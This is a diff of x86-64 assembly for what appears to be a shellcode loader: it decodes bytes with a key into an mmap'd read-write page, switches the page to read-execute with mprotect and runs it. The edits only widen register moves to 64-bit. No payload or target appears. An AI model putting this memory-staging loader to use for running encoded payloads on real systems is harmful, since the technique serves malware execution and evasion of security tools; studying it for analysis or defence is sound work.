@@ -16,15 +16,15 @@ section .rodata
 section .text
 
 _start:
-    mov r12, msglen             ; Number of bytes to process
-    mov r13, 0	                ; Key index = 0
-    mov r14, 0			; for location in rax buffer
+    mov r12, msglen    ; Number of bytes to process
+    mov r13, 0         ; Key index = 0
+    mov r14, 0         ; for location in rax buffer
 
 ; Allocate memory for shellcode, make it RW
-    mov     eax, 9          ; __NR_mmap 
-    mov     edi, 0          ; addr = NULL
-    mov     esi, 4096       ; length
-    mov     edx, 3          ; PROT_READ | PROT_WRITE
+    mov     rax, 9          ; __NR_mmap 
+    mov     rdi, 0          ; addr = NULL
+    mov     rsi, 4096       ; length
+    mov     rdx, 3          ; PROT_READ | PROT_WRITE
     mov     r10, 0x22       ; MAP_PRIVATE | MAP_ANONYMOUS
     mov     r8, -1          ; fd = -1
     xor     r9, r9          ; offset = 0
@@ -58,10 +58,10 @@ copy_loop:
 copy_done:
 
     ; Change RW -> RX using mprotect
-    mov eax, 10         ; __NR_mprotect
+    mov rax, 10         ; __NR_mprotect
     mov rdi, rbx        ; address of buffer for shellcode
-    mov esi, 4096       ; length
-    mov edx, 5          ; PROT_READ | PROT_EXEC
+    mov rsi, 4096       ; length
+    mov rdx, 5          ; PROT_READ | PROT_EXEC
     syscall
 
     ; do the thang
@@ -70,9 +70,9 @@ copy_done:
     ; deallocate the memory
 
     ; munmap(address, length)
-    mov     eax, 11             ; sys_munmap
+    mov     rax, 11             ; sys_munmap
     mov     rdi, rbx            ; address returned by mmap
-    mov     esi, 4096           ; length = 4096
+    mov     rsi, 4096           ; length = 4096
     syscall
  
     ; exit
